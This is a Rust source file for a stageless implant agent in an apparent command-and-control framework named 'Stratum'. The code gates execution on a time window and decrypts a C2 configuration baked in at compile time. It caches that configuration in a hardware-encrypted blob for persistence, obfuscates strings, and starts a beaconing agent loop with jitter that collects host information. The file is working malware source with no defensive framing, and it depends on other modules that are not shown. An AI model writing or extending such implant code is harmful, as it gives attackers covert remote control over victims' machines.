//! Stageless-enc agent — transport creds baked in plain, C2 config encrypted with stub_secret baked in stub.
//!
//! On first run:
//!   1. Check time window.
//!   2. Try local hw-encrypted blob (BLOB_PATH) first — ddb-first model.
//!   3. If blob missing: decrypt STRATUM_ENCRYPTED_CONFIG with STUB_SECRET baked at compile time.
//!   4. Cache hw-encrypted config to BLOB_PATH.
//!   5. Start C2 agent loop with decrypted config.
//!
//! On subsequent runs (blob cached):
//!   1. Check time window.
//!   2. Load from BLOB_PATH directly — no cloud access needed.
//!   3. Start C2 agent loop.
//!
//! Config wire format (pipe-separated, 9 fields):
//!   folder_path|input_file|output_file|heartbeat_file|base_sleep|jitter|pub_key_b64|stun_ip|session_key_hex

use crate::{s, crypto, crypto_compat, exec, hw, sysinfo, transport};
use std::sync::Arc;

const STUB_SECRET:      &str = env!("STRATUM_STUB_SECRET");
const SALT:             &str = env!("STRATUM_SALT");
const ENCRYPTED_CONFIG: &str = env!("STRATUM_ENCRYPTED_CONFIG");
const WINDOW_START:     &str = env!("STRATUM_WINDOW_START");
const WINDOW_END:       &str = env!("STRATUM_WINDOW_END");

#[cfg(not(windows))] const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_LINUX");
#[cfg(windows)]      const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_WIN");

struct AgentCfg {
    folder_path:     String,
    input_file:      String,
    output_file:     String,
    heartbeat_file:  String,
    base_sleep:      u64,
    jitter_pct:      u64,
    pub_key_b64:     String,
    stun_ip:         String,
    session_key_hex: String,
    prekey_pool_b64: String,
}

pub fn run() {
    while !crate::in_window(WINDOW_START, WINDOW_END) {
        if cfg!(stratum_debug) { eprintln!("[stageless-enc] outside time window, sleeping"); }
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
    if cfg!(stratum_debug) { eprintln!("[stageless-enc] time window OK"); }

    let t = transport::new_transport();

    // ddb-first: try local hw-encrypted blob before decrypting the baked config
    let cfg = if let Some(c) = try_blob() {
        if cfg!(stratum_debug) { eprintln!("[stageless-enc] blob OK"); }
        c
    } else if let Some(c) = try_bootstrap() {
        if cfg!(stratum_debug) { eprintln!("[stageless-enc] bootstrap OK, caching"); }
        c
    } else {
        if cfg!(stratum_debug) { eprintln!("[stageless-enc] no config available, exiting"); }
        return;
    };

    start_agent(cfg, &t);
}

fn try_bootstrap() -> Option<AgentCfg> {
    if cfg!(stratum_debug) { eprintln!("[stageless-enc] decrypting config with stub_secret"); }
    let plain  = crypto_compat::openssl_decrypt(STUB_SECRET, ENCRYPTED_CONFIG)?;
    let pfx = s!("STRATUM:");
    let data   = plain.strip_prefix(&pfx)?.to_string();
    let cfg    = parse_cfg(&data)?;
    if cfg!(stratum_debug) { eprintln!("[stageless-enc] config parsed OK, caching"); }
    cache_cfg(&data);
    Some(cfg)
}

fn try_blob() -> Option<AgentCfg> {
    if cfg!(stratum_debug) { eprintln!("[stageless-enc] reading blob: {}", BLOB_PATH); }
    let plain = hw::read_blob(BLOB_PATH, SALT)?;
    let pfx = s!("STRATUM:");
    let data  = plain.strip_prefix(&pfx)?.to_string();
    parse_cfg(&data)
}

fn parse_cfg(data: &str) -> Option<AgentCfg> {
    let p: Vec<&str> = data.splitn(10, '|').collect();
    if p.len() < 9 { return None; }
    Some(AgentCfg {
        folder_path:     p[0].to_string(),
        input_file:      p[1].to_string(),
        output_file:     p[2].to_string(),
        heartbeat_file:  p[3].to_string(),
        base_sleep:      p[4].parse().ok()?,
        jitter_pct:      p[5].parse().ok()?,
        pub_key_b64:     p[6].to_string(),
        stun_ip:         p[7].to_string(),
        session_key_hex: p[8].to_string(),
        prekey_pool_b64: p.get(9).unwrap_or(&"").to_string(),
    })
}

fn cache_cfg(data: &str) {
    let payload = format!("{}{}", s!("STRATUM:"), data);
    hw::write_blob(BLOB_PATH, payload.as_bytes(), SALT);
}

fn start_agent(cfg: AgentCfg, t: &transport::SharedTransport) {
    let pem = match crate::decode_pem(&cfg.pub_key_b64) {
        Some(p) => p,
        None    => { if cfg!(stratum_debug) { eprintln!("[stageless-enc] FATAL: public key decode failed"); } return; },
    };
    let pub_key = match crypto::load_public_key(&pem) {
        Ok(k)  => k,
        Err(e) => { if cfg!(stratum_debug) { eprintln!("[stageless-enc] FATAL: public key load failed: {e}"); } return; },
    };
    if cfg!(stratum_debug) { eprintln!("[stageless-enc] public key OK, starting agent loop"); }

    let session_key: [u8; 32] = {
        let decoded = hex::decode(&cfg.session_key_hex).unwrap_or_default();
        if decoded.len() != 32 {
            if cfg!(stratum_debug) { eprintln!("[stageless-enc] FATAL: session key invalid length"); }
            return;
        }
        let mut k = [0u8; 32];
        k.copy_from_slice(&decoded);
        k
    };

    let state = Arc::new(exec::AgentState::new(
        cfg.base_sleep, cfg.jitter_pct,
        &cfg.folder_path, BLOB_PATH,
        &cfg.input_file, &cfg.output_file,
    ));
    let info = sysinfo::AgentInfo::collect(&cfg.stun_ip);
    let start_cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_default();

    let prekey_pool = crate::epoch::decode_prekey_pool(&cfg.prekey_pool_b64);
    let agent_id = crate::epoch::derive_agent_id(&session_key);
    let epoch_blob = format!("{}.epoch", BLOB_PATH);
    let mut epoch_state = crate::restore_or_bootstrap_epoch(&epoch_blob, &prekey_pool, &session_key, &agent_id);

    crate::run_loop(
        &info, &start_cwd, &pub_key, &session_key, t, &state,
        &cfg.folder_path, &cfg.input_file, &cfg.output_file, &cfg.heartbeat_file,
        BLOB_PATH, WINDOW_START, WINDOW_END,
        &mut epoch_state, &prekey_pool, &agent_id,
    );
}
